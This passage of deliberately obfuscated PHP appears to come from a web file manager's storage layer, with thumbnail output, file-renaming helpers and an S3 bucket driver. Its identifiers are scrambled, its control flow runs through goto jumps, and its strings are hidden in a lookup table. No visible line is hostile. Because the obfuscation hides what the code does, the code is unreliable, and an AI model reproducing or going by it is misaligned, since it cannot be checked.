IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $B§†ĞğÍ¥ï[172]))) { $Bä˜£ƒ’ĞÚ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $B§†ĞğÍ¥ï[173]); } else { $Bä˜£ƒ’ĞÚ = KodIO::make($A¯±âï“çÊ); } if ($A¯±âï“çÊ = IO::fileNameExist($Bä˜£ƒ’ĞÚ, $fä’‹¡Š™)) { $c˜ëôä°›í = KodIO::make($A¯±âï“çÊ); return IO::fileOut($c˜ëôä°›í, !1, $d÷¶İìÄÜ); } goto eŠÙÔºÆŠ»; eŠÙÔºÆŠ»: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $c˜ëôä°›í = DATA_THUMB . $fä’‹¡Š™; del_file($c˜ëôä°›í); goto d¤Õ˜ÑŞŠÅ; eìÂš­Ò÷Ó: if (isset($GLOBALS[$B§†ĞğÍ¥ï[162]]) && $GLOBALS[$B§†ĞğÍ¥ï[162]][$B§†ĞğÍ¥ï[76]] == $eÆéÁÖ»‘¡[$B§†ĞğÍ¥ï[76]]) { $bÛÎÎ¥¹„ß = $GLOBALS[$B§†ĞğÍ¥ï[162]][$B§†ĞğÍ¥ï[163]]; if (!$eÆéÁÖ»‘¡[$B§†ĞğÍ¥ï[164]]) { $eÆéÁÖ»‘¡[$B§†ĞğÍ¥ï[164]] = $GLOBALS[$B§†ĞğÍ¥ï[162]]; } if (isset($bÛÎÎ¥¹„ß[$B§†ĞğÍ¥ï[165]])) { if ($bÛÎÎ¥¹„ß[$B§†ĞğÍ¥ï[165]] <= $a¹­÷¢º‰¡ && $bÛÎÎ¥¹„ß[$B§†ĞğÍ¥ï[166]] <= $a¹­÷¢º‰¡) { $føˆÜ–¡³ = !0; } } $d÷¶İìÄÜ = $eÆéÁÖ»‘¡[$B§†ĞğÍ¥ï[164]][$B§†ĞğÍ¥ï[28]]; } if ($eÆéÁÖ»‘¡[$B§†ĞğÍ¥ï[78]] <= 1024 * 50 || $føˆÜ–¡³ || !function_exists($B§†ĞğÍ¥ï[167]) || $eÆéÁÖ»‘¡[$B§†ĞğÍ¥ï[168]] == $B§†ĞğÍ¥ï[169]) { return $this->fileOut($dÜ¶¨¯ª•ò, !1, $d÷¶İìÄÜ); } if (isset($eÆéÁÖ»‘¡[$B§†ĞğÍ¥ï[164]][$B§†ĞğÍ¥ï[170]])) { $E²Ê¾—¶íº = $eÆéÁÖ»‘¡[$B§†ĞğÍ¥ï[164]][$B§†ĞğÍ¥ï[170]]; } else { if (isset($eÆéÁÖ»‘¡[$B§†ĞğÍ¥ï[164]][$B§†ĞğÍ¥ï[171]])) { $E²Ê¾—¶íº = $eÆéÁÖ»‘¡[$B§†ĞğÍ¥ï[164]][$B§†ĞğÍ¥ï[171]]; } else { $E²Ê¾—¶íº = md5("{$eÆéÁÖ»‘¡[$B§†ĞğÍ¥ï[28]]}\137{$eÆéÁÖ»‘¡[$B§†ĞğÍ¥ï[76]]}\x5f{$eÆéÁÖ»‘¡[$B§†ĞğÍ¥ï[78]]}"); } } goto F¡ìŞÎó; DçôÑ‘¦¦ô: del_file($c˜ëôä°›í); IO::fileOut($e‰â»ŒØÙÛ); goto fÙ¶‚²«; d¤Õ˜ÑŞŠÅ: if (!@file_exists($c˜ëôä°›í)) { $C‡ÇùÔæÅî = TEMP_FILES; if (!is_dir($C‡ÇùÔæÅî)) { mk_dir($C‡ÇùÔæÅî); } $EìØŒ·¾å = $C‡ÇùÔæÅî . $E²Ê¾—¶íº . $B§†ĞğÍ¥ï[95] . $eÆéÁÖ»‘¡[$B§†ĞğÍ¥ï[168]]; if (!@file_exists($EìØŒ·¾å)) { $EìØŒ·¾å = $this->download($dÜ¶¨¯ª•ò, $EìØŒ·¾å); } ImageThumb::createThumb($EìØŒ·¾å, $c˜ëôä°›í, $a¹­÷¢º‰¡, $a¹­÷¢º‰¡ * 10); } if (!file_exists($c˜ëôä°›í) || filesize($c˜ëôä°›í) < 100) { return @file_exists($EìØŒ·¾å) ? IO::fileOut($EìØŒ·¾å) : $this->fileOut($dÜ¶¨¯ª•ò); } if (!($e‰â»ŒØÙÛ = IO::move($c˜ëôä°›í, $Bä˜£ƒ’ĞÚ))) { return IO::fileOut($c˜ëôä°›í); } goto DçôÑ‘¦¦ô; A¸óôÚèŠŒ: $B§†ĞğÍ¥ï =& $_SERVER[¬ı§†‰ú˜¼]; set_timeout(); if (substr($dÜ¶¨¯ª•ò, 0, 4) == $B§†ĞğÍ¥ï[147]) { $this->fileOutLink($dÜ¶¨¯ª•ò); } goto béÃŠ†ŠÁê; béÃŠ†ŠÁê: $eÆéÁÖ»‘¡ = $this->info($dÜ¶¨¯ª•ò); $d÷¶İìÄÜ = $eÆéÁÖ»‘¡[$B§†ĞğÍ¥ï[28]]; $føˆÜ–¡³ = !1; goto eìÂš­Ò÷Ó; fÙ¶‚²«: } public function fileOutImageServer($D‡«ÆÂ¶…, $aÎ‚áöÑ„ = 250) { $this->fileOutImage($D‡«ÆÂ¶…, $aÎ‚áöÑ„); } public function fileNameAuto($d„¡­‚ó, $cªõ£ƒÀÚø, $CğÑ±Üôï‘ = REPEAT_RENAME, $BğÂ®ï ¤Š = false) { goto C±Ù¶‡âğ; C±Ù¶‡âğ: $eì§ô´áèÆ =& $_SERVER[¬ı§†‰ú˜¼]; $b¥É£–—ºË = $d„¡­‚ó === $eì§ô´áèÆ[33] ? $cªõ£ƒÀÚø : rtrim($d„¡­‚ó, $eì§ô´áèÆ[8]) . $eì§ô´áèÆ[8] . $cªõ£ƒÀÚø; if ($CğÑ±Üôï‘ == REPEAT_REPLACE || !$this->exist($b¥É£–—ºË) || $BğÂ®ï ¤Š && $CğÑ±Üôï‘ != REPEAT_RENAME_FOLDER) { return $cªõ£ƒÀÚø; } goto c¾¹¤çø„ñ; c¾¹¤çø„ñ: if ($CğÑ±Üôï‘ == REPEAT_SKIP) { return !1; } $F†¡¤¬®ÑŒ = $eì§ô´áèÆ[95] . get_path_ext($cªõ£ƒÀÚø); $F†¡¤¬®ÑŒ = $F†¡¤¬®ÑŒ == $eì§ô´áèÆ[95] || $BğÂ®ï ¤Š ? $eì§ô´áèÆ[33] : $F†¡¤¬®ÑŒ; goto BÙƒŒƒˆä–; BÙƒŒƒˆä–: $dÃãÚÌ¡õÔ = 1; $Eõ¬Ä¢÷ = substr($cªõ£ƒÀÚø, 0, strlen($cªõ£ƒÀÚø) - strlen($F†¡¤¬®ÑŒ)); $eïõ°îá–¾ = $Eõ¬Ä¢÷ . "\50{$dÃãÚÌ¡õÔ}\51{$F†¡¤¬®ÑŒ}"; goto D‚‡„†¦ƒ¿; D‚‡„†¦ƒ¿: while ($this->exist(rtrim($d„¡­‚ó, $eì§ô´áèÆ[8]) . $eì§ô´áèÆ[8] . $eïõ°îá–¾)) { $eïõ°îá–¾ = $Eõ¬Ä¢÷ . "\x28{$dÃãÚÌ¡õÔ}\x29{$F†¡¤¬®ÑŒ}"; $dÃãÚÌ¡õÔ++; } return $eïõ°îá–¾; goto B‹İÇóÓ¾÷; B‹İÇóÓ¾÷: } private function fileNameAutoList($B‡šÛòä¡, $BçÇ…ÏùØÚ, $a‡ğ„ÜÓ‚§ = false) { goto d”ô¸ŞÚ¨; Aâì‚Ÿ‰—: $E””£ŠèŸ‘ = array_to_keyvalue($c¹¹Ç•İ¨, $cŒ¦Î¨ø×å[33], $cŒ¦Î¨ø×å[28]); $BóĞ÷ÇÂ¤ø = $cŒ¦Î¨ø×å[95] . get_path_ext($BçÇ…ÏùØÚ); $BóĞ÷ÇÂ¤ø = $BóĞ÷ÇÂ¤ø == $cŒ¦Î¨ø×å[95] || $a‡ğ„ÜÓ‚§ ? $cŒ¦Î¨ø×å[33] : $BóĞ÷ÇÂ¤ø; goto A³£«Ñ¢İ; A³£«Ñ¢İ: $aø˜²å‡¡ê = substr($BçÇ…ÏùØÚ, 0, strlen($BçÇ…ÏùØÚ) - strlen($BóĞ÷ÇÂ¤ø)); $EŒ“ß¡ÈÕ = $aø˜²å‡¡ê . "\x28\60\x29{$BóĞ÷ÇÂ¤ø}"; for ($c›…í¶›Ú  = 1; $c›…í¶›Ú  <= count($E””£ŠèŸ‘) + 1; $c›…í¶›Ú ++) { $EŒ“ß¡ÈÕ = $aø˜²å‡¡ê . "\x28{$c›…í¶›Ú }\51{$BóĞ÷ÇÂ¤ø}"; if (!in_array_not_case($EŒ“ß¡ÈÕ, $E””£ŠèŸ‘)) { return $EŒ“ß¡ÈÕ; } } goto Cå‘Ü˜Ï´Ğ; Cå‘Ü˜Ï´Ğ: return $EŒ“ß¡ÈÕ; goto a¶ğ‰ä„šÃ; d”ô¸ŞÚ¨: $cŒ¦Î¨ø×å =& $_SERVER[¬ı§†‰ú˜¼]; $c¹¹Ç•İ¨ = $this->listPath($B‡šÛòä¡, !0); $c¹¹Ç•İ¨ = array_merge($c¹¹Ç•İ¨[$cŒ¦Î¨ø×å[75]], $c¹¹Ç•İ¨[$cŒ¦Î¨ø×å[74]]); goto Aâì‚Ÿ‰—; a¶ğ‰ä„šÃ: } public function listAllFiles($Fê˜”µ¿ˆÔ, $f˜ÏÉä¤‹, $bæ×ô©… = array()) { goto aóª§âËİ; Dï¼ï­Ò—´: $Fê˜”µ¿ˆÔ = trim($Fê˜”µ¿ˆÔ, $d‘ĞåßÈ[8]); foreach ($f˜ÏÉä¤‹ as $Cï¥”óç•¸) { $f¶åÅè“Ş— = ltrim(substr(trim($Cï¥”óç•¸, $d‘ĞåßÈ[8]), strlen($Fê˜”µ¿ˆÔ)), $d‘ĞåßÈ[8]); $BŒä†«å‡« = array_merge($BŒä†«å‡«, $this->slicePath($f¶åÅè“Ş—)); } $bçÔÈÓ«Å = array(); goto Fò¼ó¢Ô›; aóª§âËİ: $d‘ĞåßÈ =& $_SERVER[¬ı§†‰ú˜¼]; if (empty($f˜ÏÉä¤‹)) { return array(); } $BŒä†«å‡« = array(); goto Dï¼ï­Ò—´; Fò¼ó¢Ô›: foreach (array_unique($BŒä†«å‡«) as $Cï¥”óç•¸) { $Aâß¢¦©´ = array($d‘ĞåßÈ[76] => $this->getPathOuter($d‘ĞåßÈ[8] . $Fê˜”µ¿ˆÔ . $d‘ĞåßÈ[8] . $Cï¥”óç•¸), $d‘ĞåßÈ[77] => 1, $d‘ĞåßÈ[78] => 0); if (substr($Cï¥”óç•¸, -1) != $d‘ĞåßÈ[8]) { $Aâß¢¦©´[$d‘ĞåßÈ[77]] = 0; $a””¡ºÈß¯ = $this->getPath($Fê˜”µ¿ˆÔ . $d‘ĞåßÈ[8] . $Cï¥”óç•¸); $Aâß¢¦©´[$d‘ĞåßÈ[78]] = isset($bæ×ô©…[$a””¡ºÈß¯]) ? $bæ×ô©…[$a””¡ºÈß¯] : $this->size($a””¡ºÈß¯); } $bçÔÈÓ«Å[] = $Aâß¢¦©´; } return $bçÔÈÓ«Å; goto fˆ”¨ğİÊ; fˆ”¨ğİÊ: } public function slicePath($c†õ‘¿ŠŒÚ) { $eõ¯Áƒ£‹ =& $_SERVER[¬ı§†‰ú˜¼]; $f‰¿Êí†—¢ = explode($eõ¯Áƒ£‹[8], trim($c†õ‘¿ŠŒÚ, $eõ¯Áƒ£‹[8])); $aÛà·íÎò = 0; do { ++$aÛà·íÎò; $fµì³Ü“šï[] = implode($eõ¯Áƒ£‹[8], array_slice($f‰¿Êí†—¢, 0, $aÛà·íÎò)) . $eõ¯Áƒ£‹[8]; } while ($aÛà·íÎò < count($f‰¿Êí†—¢)); $fµì³Ü“šï[count($f‰¿Êí†—¢) - 1] = $c†õ‘¿ŠŒÚ; return $fµì³Ü“šï; } public function getHost() { $Cî±ééÓØ =& $_SERVER[¬ı§†‰ú˜¼]; $E‘–Òî¤õ = parse_url(trim($this->domain, $Cî±ééÓØ[8])); $FÛÇ™©ôÜ‡ = isset($E‘–Òî¤õ[$Cî±ééÓØ[174]]) ? $E‘–Òî¤õ[$Cî±ééÓØ[174]] : http_type(); $e“”‡‚Ï©‘ = isset($E‘–Òî¤õ[$Cî±ééÓØ[175]]) ? $E‘–Òî¤õ[$Cî±ééÓØ[175]] : $E‘–Òî¤õ[$Cî±ééÓØ[76]]; if (isset($E‘–Òî¤õ[$Cî±ééÓØ[176]])) { $e“”‡‚Ï©‘ .= $Cî±ééÓØ[4] . $E‘–Òî¤õ[$Cî±ééÓØ[176]]; } return $FÛÇ™©ôÜ‡ . $Cî±ééÓØ[177] . $e“”‡‚Ï©‘; } public function pathEncode($AÙ÷èĞØù‰) { $Fèã·Ÿ¶º =& $_SERVER[¬ı§†‰ú˜¼]; return str_replace($Fèã·Ÿ¶º[178], $Fèã·Ÿ¶º[8], rawurlencode($AÙ÷èĞØù‰)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($BÍ‚¾Ùš») { set_timeout(); require_once SDK_DIR . $_SERVER[¬ı§†‰ú˜¼][179]; parent::__construct(); $this->_init($BÍ‚¾Ùš»); } public function _init($f‰ìÄÖ¯â–) { foreach ($f‰ìÄÖ¯â– as $Aí¸ôÃ¬ => $bñÂ÷»­Šô) { if (isset($this->{$Aí¸ôÃ¬})) { $this->{$Aí¸ôÃ¬} = $bñÂ÷»­Šô; } } $this->endpoint = $f‰ìÄÖ¯â–[$_SERVER[¬ı§†‰ú˜¼][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($D†ÆÜÍ±¹’ = "\x76\64") { $this->signVer = $D†ÆÜÍ±¹’; $this->client->setSignatureVersion($D†ÆÜÍ±¹’); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto bã‘ä·êæ; eçŞ”×Áíğ: $B“Î¸»»á² = array($AÖÜ©é–ê·[186], $AÖÜ©é–ê·[187], $AÖÜ©é–ê·[188], $AÖÜ©é–ê·[189], $AÖÜ©é–ê·[190]); $FŞ²´ª­Îø = array_diff($B“Î¸»»á², $E°ÃãåÕ¬¼); return empty($FŞ²´ª­Îø); goto bóİ›ˆ›·Û; bã‘ä·êæ: $AÖÜ©é–ê· =& $_SERVER[¬ı§†‰ú˜¼]; $aºõÔÛ÷†„ = $this->getBucketCors(); if (!$aºõÔÛ÷†„ || !is_array($aºõÔÛ÷†„)) { return !1; } goto bîàÃÃÁ; bîàÃÃÁ: if ($aºõÔÛ÷†„[$AÖÜ©é–ê·[181]] != $AÖÜ©é–ê·[182] || $aºõÔÛ÷†„[$AÖÜ©é–ê·[183]] != $AÖÜ©é–ê·[182]) { return !1; } $E°ÃãåÕ¬¼ = array_map($AÖÜ©é–ê·[184], $aºõÔÛ÷†„[$AÖÜ©é–ê·[185]]); if (!is_array($E°ÃãåÕ¬¼)) { $E°ÃãåÕ¬¼ = array(); } goto eçŞ”×Áíğ; bóİ›ˆ›·Û: } public function mkfile($F¤À°Š¶¢š, $EÜÏ£‚’ç = '', $Fù™Â›Ø¾† = REPEAT_RENAME) { $E×¦ó´¾·ã = $this->setContent($F¤À°Š¶¢š, $EÜÏ£‚’ç); if ($E×¦ó´¾·ã !== !1) { return $this->getPathOuter($F¤À°Š¶¢š); } return !1; } public function mkdir($c¬³›Ÿ†ğô, $EÂ÷ŒÂĞˆù = REPEAT_SKIP) { if (empty($c¬³›Ÿ†ğô)) { return !1; } if ($this->_isFolder($c¬³›Ÿ†ğô)) { return $this->getPathOuter($c¬³›Ÿ†ğô); } $A–Ê°¥ëÍ† = $this->setContent($c¬³›Ÿ†ğô, $_SERVER[¬ı§†‰ú˜¼][33], !0); if ($A–Ê°¥ëÍ† !== !1) { return $this->getPathOuter($c¬³›Ÿ†ğô); } return !1; } public function copyFile($eÂ‚÷œ² º, $b­ã„ĞÄôó, $eÑäò¢©ë™ = array()) { $B¼‰öÛ§‚Ò =& $_SERVER[¬ı§†‰ú˜¼]; $DÉˆÚÓÀ² = $this->objectMeta($eÂ‚÷œ² º); if (!$DÉˆÚÓÀ²) { return !1; } if ($DÉˆÚÓÀ²[$B¼‰öÛ§‚Ò[78]] <= 1024 * 1024 * 200) { $aã”°›”´ = $this->client->copyObject($this->bucket, $eÂ‚÷œ² º, $this->bucket, $b­ã„ĞÄôó, $B¼‰öÛ§‚Ò[191], $eÑäò¢©ë™); } else { $aã”°›”´ = $this->client->multiCopyObject($this->bucket, $eÂ‚÷œ² º, $this->bucket, $b­ã„ĞÄôó, $eÑäò¢©ë™); } $aã”°›”´ = $aã”°›”´ ? $this->getPathOuter($b­ã„ĞÄôó) : !1; return $aã”°›”´; } public function moveFile($FÈàİ°¬ÊÚ, $d±š˜±–§) { if ($this->copyFile($FÈàİ°¬ÊÚ, $d±š˜±–§)) { $this->delFile($FÈàİ°¬ÊÚ); return $this->getPathOuter($d±š˜±–§); } return !1; } public function delFile($A·¢¿Š’°…) { return $this->client->deleteObject($this->bucket, $A·¢¿Š’°…); } public function delFolder($A½¸øïõ’) { goto F«¶Š¬³¡ó; aÍ—¦ï¸¦: return $this->delByBatch($AºöÙ«È¨ï[$cŸé¸Àª‡‰[75]]); goto B…­Ø°±İ™; A¨•ñ†—Å«: $AºöÙ«È¨ï = $this->fileList($A½¸øïõ’); $this->listItemCache = !0; $FË§ÃïÆÙÄ = trim($A½¸øïõ’, $cŸé¸Àª‡‰[8]) . $cŸé¸Àª‡‰[8]; goto DÂ¤ê‰¾ì—; DÂ¤ê‰¾ì—: if (!empty($A½¸øïõ’) && !in_array($FË§ÃïÆÙÄ, $AºöÙ«È¨ï[$cŸé¸Àª‡‰[75]])) { $AºöÙ«È¨ï[$cŸé¸Àª‡‰[75]][] = $FË§ÃïÆÙÄ; } $fê¡ù‰­øŠ = $this->delByBatch($AºöÙ«È¨ï[$cŸé¸Àª‡‰[74]]); if (!$fê¡ù‰­øŠ) { return !1; } goto aÍ—¦ï¸¦; F«¶Š¬³¡ó: $cŸé¸Àª‡‰ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->exist($A½¸øïõ’)) { return !0; } $this->listItemCache = !1; goto A¨•ñ†—Å«; B…­Ø°±İ™: } private function delByBatch($d¤›ï°î„•) { foreach (array_chunk($d¤›ï°î„•, 1000) as $D¬¤â¡é‚å) { $DÇäì£êĞ¾ = $this->client->deleteObjects($this->bucket, $D¬¤â¡é‚å); if (!$DÇäì£êĞ¾) { return !1; } } return !0; } public function rename($B©ĞßøÜ©ƒ, $e½Õìà„ì) { return $this->renameObject($B©ĞßøÜ©ƒ, $e½Õìà„ì); } public function listPath($F¹Ë»±÷¶µ, $f¥ãæ„‹àê = false) { $C‰÷øã¯Ô =& $_SERVER[¬ı§†‰ú˜¼]; $E³ÖÜÈ£Äã = $this->fileList($F¹Ë»±÷¶µ, $C‰÷øã¯Ô[8], !0); foreach ($E³ÖÜÈ£Äã[$C‰÷øã¯Ô[75]] as $E¥ñ©ÈÆ°‡ => $c¯±¿ğÉ–) { $E³ÖÜÈ£Äã[$C‰÷øã¯Ô[75]][$E¥ñ©ÈÆ°‡] = $this->folderInfo($c¯±¿ğÉ–, $f¥ãæ„‹àê); } foreach ($E³ÖÜÈ£Äã[$C‰÷øã¯Ô[74]] as $E¥ñ©ÈÆ°‡ => $c¯±¿ğÉ–) { $E³ÖÜÈ£Äã[$C‰÷øã¯Ô[74]][$E¥ñ©ÈÆ°‡] = $this->fileInfo($c¯±¿ğÉ–[$C‰÷øã¯Ô[28]], $f¥ãæ„‹àê, $c¯±¿ğÉ–); } return $E³ÖÜÈ£Äã; } private function fileInfo($eÈ¾Ú›ÊëÙ, $d¸È‘Î«·Ì = false, $a¥¦Ë–†¥ = array()) { goto eÆä‡—´¢£; aÒ¬Â½˜õº: $EÚ•ÄÑæš’[$B¤±º·¿[193]] = $EÚ•ÄÑæš’[$B¤±º·¿[84]] = 0; $EÚ•ÄÑæš’[$B¤±º·¿[194]] = $EÚ•ÄÑæš’[$B¤±º·¿[195]] = !0; if (empty($a¥¦Ë–†¥)) { $a¥¦Ë–†¥ = $this->objectMeta($eÈ¾Ú›ÊëÙ); if (!$a¥¦Ë–†¥) { return $EÚ•ÄÑæš’; } } goto A¾ÈÄÅŒ³; A¾ÈÄÅŒ³: if (isset($a¥¦Ë–†¥[$B¤±º·¿[196]])) { $EÚ•ÄÑæš’[$B¤±º·¿[84]] = $a¥¦Ë–†¥[$B¤±º·¿[196]]; } if (isset($a¥¦Ë–†¥[$B¤±º·¿[78]])) { $EÚ•ÄÑæš’[$B¤±º·¿[78]] = $a¥¦Ë–†¥[$B¤±º·¿[78]]; } return $EÚ•ÄÑæš’; goto A›ô¥ÊÕ–à; eÆä‡—´¢£: $B¤±º·¿ =& $_SERVER[¬ı§†‰ú˜¼]; $EÚ•ÄÑæš’ = array($B¤±º·¿[28] => $this->pathThis($eÈ¾Ú›ÊëÙ), $B¤±º·¿[76] => $this->getPathOuter($eÈ¾Ú›ÊëÙ), $B¤±º·¿[29] => $B¤±º·¿[192], $B¤±º·¿[168] => $this->ext($eÈ¾Ú›ÊëÙ), $B¤±º·¿[78] => isset($a¥¦Ë–†¥[$B¤±º·¿[78]]) ? $a¥¦Ë–†¥[$B¤±º·¿[78]] : 0); if ($d¸È‘Î«·Ì) { return $EÚ•ÄÑæš’; } goto aÒ¬Â½˜õº; A›ô¥ÊÕ–à: } private function folderInfo($F÷æª¸‚‘Í, $dŒİÇôô› = false) { goto e¨°±µ¬¥ ; e¨°±µ¬¥ : $B¥ğ£ö“á’ =& $_SERVER[¬ı§†‰ú˜¼]; $F¬Ñ”Ç¡—İ = array($B¥ğ£ö“á’[28] => $this->pathThis($F÷æª¸‚‘Í), $B¥ğ£ö“á’[76] => $this->getPathOuter($B¥ğ£ö“á’[8] . $F÷æª¸‚‘Í), $B¥ğ£ö“á’[29] => $B¥ğ£ö“á’[77]); if ($dŒİÇôô›) { return $F¬Ñ”Ç¡—İ; } goto c›Û›„ŒÛ; c›Û›„ŒÛ: $F¬Ñ”Ç¡—İ[$B¥ğ£ö“á’[193]] = $F¬Ñ”Ç¡—İ[$B¥ğ£ö“á’[84]] = 0; $F¬Ñ”Ç¡—İ[$B¥ğ£ö“á’[194]] = $F¬Ñ”Ç¡—İ[$B¥ğ£ö“á’[195]] = !0; if ($F÷æª¸‚‘Í == $B¥ğ£ö“á’[33]) { return $F¬Ñ”Ç¡—İ; } goto EœŞĞ´¦‰; E­¿‰‘®”: return $F¬Ñ”Ç¡—İ; goto eÍÀÆˆÚˆ‚; EœŞĞ´¦‰: $F÷æª¸‚‘Í = trim($F÷æª¸‚‘Í, $B¥ğ£ö“á’[8]) . $B¥ğ£ö“á’[8]; $EÃÍ¦¢æÅ‚ = $this->objectMeta($F÷æª¸‚‘Í); if (isset($EÃÍ¦¢æÅ‚[$B¥ğ£ö“á’[196]])) { $F¬Ñ”Ç¡—İ[$B¥ğ£ö“á’[193]] = $EÃÍ¦¢æÅ‚[$B¥ğ£ö“á’[196]]; } goto E­¿‰‘®”; eÍÀÆˆÚˆ‚: } private function fileList($f‘¿¤ò²Ë, $aŸ˜‚ç¸óŞ = '', $FÂŞ¯¾‰Ì = 0) { goto fÏîä Ğ¡ ; C¹§Ç¥İ§: foreach ($B“Ú°êÕ¹ƒ[$EˆÚÄá‚‰[197]] as $d…¦ãµ¨—) { goto a’éƒ†ï³; a’éƒ†ï³: $cÙ—•Ò„¹í = $d…¦ãµ¨—[$EˆÚÄá‚‰[28]]; if ($cÙ—•Ò„¹í == $a‚Šï±á†×) { continue; } $Fí—“ÉîÃ˜ = isset($d…¦ãµ¨—[$EˆÚÄá‚‰[78]]) ? $d…¦ãµ¨—[$EˆÚÄá‚‰[78]] : 0; goto eÕ«›îĞÀ; dÕä’„¿ø§: $CàÀ±î´š[] = $FÂŞ¯¾‰Ì ? $d…¦ãµ¨— : $cÙ—•Ò„¹í; goto CÄ¼°½”äï; eÕ«›îĞÀ: $BÙğõ™Ó»› = $Fí—“ÉîÃ˜ == 0 && substr($cÙ—•Ò„¹í, strlen($cÙ—•Ò„¹í) - 1, 1) == $EˆÚÄá‚‰[8] ? !0 : !1; if ($cÎ¬ÕÔ¸Œ—) { $this->cacheMethod($EˆÚÄá‚‰[198], $cÙ—•Ò„¹í, $BÙğõ™Ó»›); $this->cacheMethod($EˆÚÄá‚‰[199], $cÙ—•Ò„¹í, $d…¦ãµ¨—); } if ($BÙğõ™Ó»›) { $E“µ±…©„ø[] = $cÙ—•Ò„¹í; continue; } goto dÕä’„¿ø§; CÄ¼°½”äï: } foreach ($B“Ú°êÕ¹ƒ[$EˆÚÄá‚‰[200]] as $d…¦ãµ¨—) { $E“µ±…©„ø[] = $d…¦ãµ¨—[$EˆÚÄá‚‰[28]]; if ($cÎ¬ÕÔ¸Œ—) { $this->cacheMethod($EˆÚÄá‚‰[198], $d…¦ãµ¨—[$EˆÚÄá‚‰[28]], !0); } } if ($cÎ¬ÕÔ¸Œ—) { $this->cacheMethod($EˆÚÄá‚‰[198], $f‘¿¤ò²Ë, !0); } goto a¼óÁÒœ”; f´ÃŒôìàé: if (!$B“Ú°êÕ¹ƒ) { return array($EˆÚÄá‚‰[75] => array(), $EˆÚÄá‚‰[74] => array()); } $cÎ¬ÕÔ¸Œ— = $this->listItemCache === !1 ? !1 : !0; $E“µ±…©„ø = $CàÀ±î´š = array(); goto C¹§Ç¥İ§; a¼óÁÒœ”: return array($EˆÚÄá‚‰[75] => $E“µ±…©„ø, $EˆÚÄá‚‰[74] => $CàÀ±î´š); goto b¸ô‹ÉÚ­Á; fÏîä Ğ¡ : $EˆÚÄá‚‰ =& $_SERVER[¬ı§†‰ú˜¼]; $a‚Šï±á†× = rtrim($f‘¿¤ò²Ë, $EˆÚÄá‚‰[8]) . $EˆÚÄá‚‰[8]; $B“Ú°êÕ¹ƒ = $this->listObjs($a‚Šï±á†×, null, null, $aŸ˜‚ç¸óŞ); goto f´ÃŒôìàé; b¸ô‹ÉÚ­Á: } private function listObjs($F²Æè“ØœÊ, $Fê³¦Øéâ¹ = null, $dæò²¬‚Ø = null, $aßíµ´½ë = null) { $CÂï¡Í¥‚ =& $_SERVER[¬ı§†‰ú˜¼]; $F²Æè“ØœÊ = trim($F²Æè“ØœÊ, $CÂï¡Í¥‚[8]); $C‘ä‘² ˆ¼ = empty($F²Æè“ØœÊ) ? $CÂï¡Í¥‚[33] : $F²Æè“ØœÊ . $CÂï¡Í¥‚[8]; return $this->client->getBucket($this->bucket, $C‘ä‘² ˆ¼, $Fê³¦Øéâ¹, $dæò²¬‚Ø, $aßíµ´½ë, !0); } public function has($aİæğ´É¤ç, $CåŒºéƒ’ = false, $eã¯ê·¬¼´ = true) { goto FÀŸì°†ôÛ; FÀŸì°†ôÛ: $Dº¾‰ƒ•à˜ =& $_SERVER[¬ı§†‰ú˜¼]; $aİæğ´É¤ç = trim($aİæğ´É¤ç, $Dº¾‰ƒ•à˜[8]); $DÉ»Â‡ó¸ = empty($aİæğ´É¤ç) ? $Dº¾‰ƒ•à˜[33] : $aİæğ´É¤ç . $Dº¾‰ƒ•à˜[8]; goto FƒÚÒ¯ïä; EîíëÆØ‡´: $e½–è§î = $C‘å¡ •òÄ = array(); while (!0) { $a½ˆŞœ¬ã = $this->listObjs($aİæğ´É¤ç, $eªâŞºÃŠ, $C±â†Ë„È, $d‡áÕ‚Ò¹ô); if (!$a½ˆŞœ¬ã) { break; } $eªâŞºÃŠ = $a½ˆŞœ¬ã[$Dº¾‰ƒ•à˜[201]]; $AØ…êõ‚â = $a½ˆŞœ¬ã[$Dº¾‰ƒ•à˜[197]]; $dÍºÎªñ÷– = $a½ˆŞœ¬ã[$Dº¾‰ƒ•à˜[200]]; if (empty($AØ…êõ‚â) && empty($dÍºÎªñ÷–)) { break; } if (count($AØ…êõ‚â) == 1 && $AØ…êõ‚â[0][$Dº¾‰ƒ•à˜[28]] == $DÉ»Â‡ó¸) { break; } if ($CåŒºéƒ’) { if (count($AØ…êõ‚â)) { $AØ…êõ‚â = array_column($AØ…êõ‚â, $Dº¾‰ƒ•à˜[28]); $e½–è§î = array_merge($e½–è§î, $AØ…êõ‚â); } if (count($dÍºÎªñ÷–)) { $dÍºÎªñ÷– = array_column($dÍºÎªñ÷–, $Dº¾‰ƒ•à˜[28]); $C‘å¡ •òÄ = array_merge($C‘å¡ •òÄ, $dÍºÎªñ÷–); } if ($eªâŞºÃŠ === null) { break; } continue; } if ($eã¯ê·¬¼´) { if (!empty($AØ…êõ‚â)) { if (count($AØ…êõ‚â) > 1 || isset($AØ…êõ‚â[0][$Dº¾‰ƒ•à˜[28]]) && $AØ…êõ‚â[0][$Dº¾‰ƒ•à˜[28]] != $DÉ»Â‡ó¸) { return !0; } } } else { if (!empty($dÍºÎªñ÷–)) { return !0; } } if ($eªâŞºÃŠ === null) { break; } } if ($CåŒºéƒ’) { $e½–è§î = array_diff($e½–è§î, array($DÉ»Â‡ó¸)); $e½–è§î = count(array_unique($e½–è§î)); $C‘å¡ •òÄ = count(array_unique($C‘å¡ •òÄ)); return array($Dº¾‰ƒ•à˜[202] => $e½–è§î, $Dº¾‰ƒ•à˜[203] => $C‘å¡ •òÄ); } goto dİšâÃ¿«ä; dİšâÃ¿«ä: return !1; goto føº¯¥Ë’…; FƒÚÒ¯ïä: $eªâŞºÃŠ = null; $C±â†Ë„È = 500; $d‡áÕ‚Ò¹ô = $Dº¾‰ƒ•à˜[8]; goto EîíëÆØ‡´; føº¯¥Ë’…: } public function 